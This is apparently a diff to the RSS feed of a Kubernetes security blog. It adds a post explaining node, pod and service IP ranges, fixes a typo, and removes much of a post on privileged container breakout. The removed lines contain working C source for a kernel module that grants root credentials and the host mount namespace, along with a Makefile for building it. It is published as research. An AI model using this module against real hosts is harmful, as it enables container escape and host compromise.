@@ -7,6 +7,74 @@
 		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>The Many IP Addresses of Kubernetes</title>
+				<description>&lt;p&gt;When getting to grips with Kubernetes one of the more complex concepts to understand is … all the IP addresses! Even looking at a simple cluster setup, you’ll get addresses in multiple different ranges. So this is a quick post to walk through where they’re coming from and what they’re used for.&lt;/p&gt;
+
+&lt;p&gt;Typically you can see at least three distinct ranges of IP addresses in a Kubernetes cluster, although this can vary depending on the distribution and container networking solution in place. Firstly there is the node network where the container, virtual machines or physical servers running the Kubernetes components are, then there is an overlay network where pods are assigned IP addresses and lastly another network range where Kubernetes services are located.&lt;/p&gt;
+
+&lt;p&gt;We’ll start with a standard &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;kind&lt;/a&gt; cluster before talking about some other sources of IP address complexity. We’ll start by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kind create cluster&lt;/code&gt; to get it up and running.&lt;/p&gt;
+
+&lt;p&gt;Once we’ve got the cluster started we can see what IP address the node has by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec -it kind-control-plane ip addr show dev eth0&lt;/code&gt; . The output of that command should look something like this&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;13: eth0@if14: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default 
+    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fc00:f853:ccd:e793::2/64 scope global nodad 
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:acff:fe12:2/64 scope &lt;span class=&quot;nb&quot;&gt;link 
+       &lt;/span&gt;valid_lft forever preferred_lft forever
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that the address assigned is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.18.0.2/16&lt;/code&gt;, which is a network controlled by Docker (as we’re running our cluster on top of Docker). If you have a Virtual machine or physical server the IP addresses will be in whatever range is assigned to the network(s) the host has.&lt;/p&gt;
+
+&lt;p&gt;So far, so simple. Now lets add a workload to our cluster and see what addresses are assigned there. Let’s start a webserver workload with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl run webserver --image=nginx&lt;/code&gt;. Once that pod starts we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl get pods webserver -o wide&lt;/code&gt; to see what IP address has been assigned to the pod.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NAME        READY   STATUS    RESTARTS   AGE   IP           NODE                 NOMINATED NODE   READINESS GATES
+webserver   1/1     Running   0          42s   10.244.0.5   kind-control-plane   &amp;lt;none&amp;gt;           &amp;lt;none&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Our pod has an IP address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.244.0.5&lt;/code&gt; which is in an entirely different subnet! This IP address is part of the overlay network that most (but not all) Kubernetes distributions use for their workloads. This subnet is generally automatically assigned by the Kubernetes &lt;a href=&quot;https://kubernetes.io/docs/concepts/extend-kubernetes/compute-storage-net/network-plugins/&quot;&gt;network plugin&lt;/a&gt; used in the cluster, so it’ll change based on the plugin in use and any specific configuration for that plugin. What’s happening here is that our Kubernetes node has created an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;veth&lt;/code&gt; interface for our pod and assigned that address to it. We can see the pod IP addresses from the hosts perspective by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec kind-control-plane ip route&lt;/code&gt; and we can see the IP addresses assigned to the different pods in the cluster, including the IP address we saw from our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get pods&lt;/code&gt; command above.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;default via 172.18.0.1 dev eth0 
+10.244.0.2 dev veth9ee91973 scope host 
+10.244.0.3 dev veth1b82cd96 scope host 
+10.244.0.4 dev veth38302a10 scope host 
+10.244.0.5 dev vethf915cecb scope host 
+172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we’ve got the node network and the pod network, let’s see what happens if we add a Kubernetes &lt;a href=&quot;https://kubernetes.io/docs/concepts/services-networking/service/&quot;&gt;service&lt;/a&gt; to the mix. We can do this by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl expose pod webserver --port 8080&lt;/code&gt; which will create a service object for our webserver pod. There are several types of service object, but by default a ClusterIP service will be created, which provides an IP address which is visible inside the cluster, but not outside it. Once our service is created we can look at the IP address by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl get services webserver&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NAME        TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE
+webserver   ClusterIP   10.96.198.83   &amp;lt;none&amp;gt;        8080/TCP   97s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see from the output that the IP address is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.96.198.83&lt;/code&gt; another IP address range! This range is set by a command line flag on the Kubernetes API server. In the case of our kind cluster, it looks like this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--service-cluster-ip-range=10.96.0.0/16&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;But from a host perspective, where does this IP address fit in. Well the reality of Kubernetes service objects is that, by default, they’re iptables rules created by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-proxy&lt;/code&gt; service on the node. We can see our webserver service by running this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec kind-control-plane iptables -t nat -L KUBE-SERVICES -v -n --line-numbers&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Chain KUBE-SERVICES (2 references)
+num   pkts bytes target     prot opt in     out     source               destination         
+1        1    60 KUBE-SVC-NPX46M4PTMTKRN6Y  6    --  *      *       0.0.0.0/0            10.96.0.1            /* default/kubernetes:https cluster IP */ tcp dpt:443
+2        0     0 KUBE-SVC-UMJOY2TYQGVV2BKY  6    --  *      *       0.0.0.0/0            10.96.198.83         /* default/webserver cluster IP */ tcp dpt:8080
+3        0     0 KUBE-SVC-TCOU7JCQXEZGVUNU  17   --  *      *       0.0.0.0/0            10.96.0.10           /* kube-system/kube-dns:dns cluster IP */ udp dpt:53
+4        0     0 KUBE-SVC-ERIFXISQEP7F7OF4  6    --  *      *       0.0.0.0/0            10.96.0.10           /* kube-system/kube-dns:dns-tcp cluster IP */ tcp dpt:53
+5        0     0 KUBE-SVC-JD5MR3NA4I4DYORP  6    --  *      *       0.0.0.0/0            10.96.0.10           /* kube-system/kube-dns:metrics cluster IP */ tcp dpt:9153
+6     7757  465K KUBE-NODEPORTS  0    --  *      *       0.0.0.0/0            0.0.0.0/0            /* kubernetes service nodeports; NOTE: this must be the last rule in this chain */ ADDRTYPE match dst-type LOCAL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;The goal of this post was just to explore a couple of concepts. Firstly, the variety of IP addresses you’re likely to see in a Kubernetes cluster and then how those tie to the operating system level.&lt;/p&gt;
+
+</description>
+				<pubDate>Fri, 01 Nov 2024 08:00:00 +0000</pubDate>
+				<link>https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</link>
+				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</guid>
+			</item>
+		
+			<item>
 				<title>Fun With GitRepo Volumes</title>
 				<description>&lt;p&gt;On Monday this week I noticed a new and really interesting blog from &lt;a href=&quot;https://x.com/ImreRad&quot;&gt;Imre Rad&lt;/a&gt;. The &lt;a href=&quot;https://irsl.medium.com/sneaky-write-hook-git-clone-to-root-on-k8s-node-e38236205d54&quot;&gt;Blog Post&lt;/a&gt; described an unpatched issue in Kubernetes, which allows any user with the ability to create &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes to execute code on the underlying host as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user! For the details of how this works, please read Imre’s blog as all the cool research is his, I’m just looking at how it might be exploited :)&lt;/p&gt;
 
@@ -645,7 +713,7 @@ Subject
   CN &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; kubernetes-admin
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Sooo this credential was no longer a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt;, interesting! Next step, as is often the case when spelunking around in Kubernetes was to go look at Github to see if any recent changes had been made to how things work. Sure enough, there was a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/pull/121305&quot;&gt;PR&lt;/a&gt; which explained how Kubeadm now has two files with initial credentials, the original &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; and a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; has been changeed to use an RBAC group for access, which should give it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cluster-admin&lt;/code&gt; rights, but in a way that they could be revoked by removing the rights of that group, and then have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt; file still be a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt; whose rights can’t be revoked by modifying RBAC.&lt;/p&gt;
+&lt;p&gt;Sooo this credential was no longer a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt;, interesting! Next step, as is often the case when spelunking around in Kubernetes was to go look at Github to see if any recent changes had been made to how things work. Sure enough, there was a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/pull/121305&quot;&gt;PR&lt;/a&gt; which explained how Kubeadm now has two files with initial credentials, the original &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; and a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; has been changed to use an RBAC group for access, which should give it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cluster-admin&lt;/code&gt; rights, but in a way that they could be revoked by removing the rights of that group, and then have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt; file still be a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt; whose rights can’t be revoked by modifying RBAC.&lt;/p&gt;
 
 &lt;p&gt;Digging back from this PR, to the referenced issue to get some back-story, I got a slight surprise to find it was &lt;a href=&quot;https://github.com/kubernetes/kubeadm/issues/2414&quot;&gt;one I’d opened&lt;/a&gt; back in 2021 about not using system:masters!&lt;/p&gt;
 
@@ -702,119 +770,6 @@ Subject
 				<pubDate>Sun, 29 Oct 2023 09:27:00 +0000</pubDate>
 				<link>https://raesene.github.io/blog/2023/10/29/exploiting-CVE-2023-5044/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2023/10/29/exploiting-CVE-2023-5044/</guid>
-			</item>
-		
-			<item>
-				<title>Fun with privileged container breakout</title>
-				<description>&lt;p&gt;One of the truisms of container security is that when a container is run as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;privileged&lt;/code&gt; (in the sense of the Docker flag, not just running as the root user) it’s insecure and possible to break out. However, there aren’t always great examples of how to break out of a privileged container in practice.&lt;/p&gt;
-
-&lt;p&gt;For containers with cgroupsv1 there was Felix Wilhelm’s great &lt;a href=&quot;https://twitter.com/_fel1x/status/1151487051986087936?s=20&quot;&gt;breakout in a tweet&lt;/a&gt;, but as more systems move to cgroupsv2, that one becomes less useful.&lt;/p&gt;
-
-&lt;p&gt;There’s also techniques based on adding entries to SSH trusted credentials and then SSH’ing to the host, but those are a little situational and need the container to be able to SSH to the host, which may not always be the case.&lt;/p&gt;
-
-&lt;p&gt;So I was on the hunt for something a bit more generally applicable that works with any setup, when I came across &lt;a href=&quot;https://pulsesecurity.co.nz/articles/docker-rootkits&quot;&gt;this post&lt;/a&gt; from Denis Andzakovic of Pulse Security, which had multiple examples of ways breaking out, so I thought it’d be interesting to explore one of these and see how well it works. Please note the clever parts of this post are all from Denis, I’m just exploring them in a bit more detail :)&lt;/p&gt;
-
-&lt;h2 id=&quot;the-setup&quot;&gt;The setup&lt;/h2&gt;
-
-&lt;p&gt;One of the things you can do in a privileged container is load new kernel modules, and kernel modules have rights that can be used for container breakout, so we should be able to use one of these to break out.&lt;/p&gt;
-
-&lt;p&gt;Looking at the examples in the Pulse blog, there’s one that allows for rewriting cred and fs structs essentially breakout out of the &lt;a href=&quot;https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-2/#mount-namespace&quot;&gt;mount namespace&lt;/a&gt; which, as you’ll see leads directly to full container breakout.&lt;/p&gt;
-
-&lt;h2 id=&quot;the-kernel-module-code&quot;&gt;The Kernel module code&lt;/h2&gt;
-
-&lt;p&gt;The code provided in the Pulse blog doesn’t work on modern Linux kernels, due to a change in function signature, but with a little help from ChatGPT, it was possible to get a version which works fine on the Linux 5.15 kernel in Ubuntu 22.04. In this case I’ve called the source code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;legit2.c&lt;/code&gt;. This code will essentially cause a process to get the mount namespace of the host when triggered by writing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/legit&lt;/code&gt; in the container.&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;linux/module.h&amp;gt;
-#include &amp;lt;linux/kernel.h&amp;gt;
-#include &amp;lt;linux/cred.h&amp;gt;
-#include &amp;lt;linux/fs_struct.h&amp;gt;
-#include &amp;lt;linux/sched/task.h&amp;gt;
-#include &amp;lt;linux/proc_fs.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tweak_fs_struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fs_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fs_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_exec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;umask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;umask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;w_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_ts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;init_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INFO&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;legitkit - fs overwrite - pid is %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;commit_creds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prepare_kernel_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;tweak_fs_struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_ts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cgroups&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_ts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cgroups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_ops&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_fops&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_write&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w_proc&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INFO&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;init procfs module&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;proc_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;legit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_fops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_cleanup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;remove_proc_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;legit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;MODULE_LICENSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GPL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;module_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;module_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_cleanup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;building-the-kernel-module&quot;&gt;Building the kernel module&lt;/h2&gt;
-
-&lt;p&gt;Now we’ve got our kernel module code we need to build it on our target machine (or another one with the same kernel version) before we can load it. For Ubuntu you’ll need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;build-essential&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kmod&lt;/code&gt; to give you the tools and then the Linux headers for the host’s kernel version.&lt;/p&gt;
-
-&lt;p&gt;Getting the Linux headers is easiest done when you’re running in a container on the target host, as you can just use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt update &amp;amp;&amp;amp; apt-get install -y linux-headers-$(uname -r)&lt;/code&gt; to get the right version.&lt;/p&gt;
-
-&lt;p&gt;Also a Makefile is handy to help compile the module, something like&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;obj-m += legit2.o
-
-all:
-  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
-
-clean:
-  make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;inserting-the-kernel-module-and-breaking-out&quot;&gt;Inserting the Kernel module and breaking out&lt;/h2&gt;
-
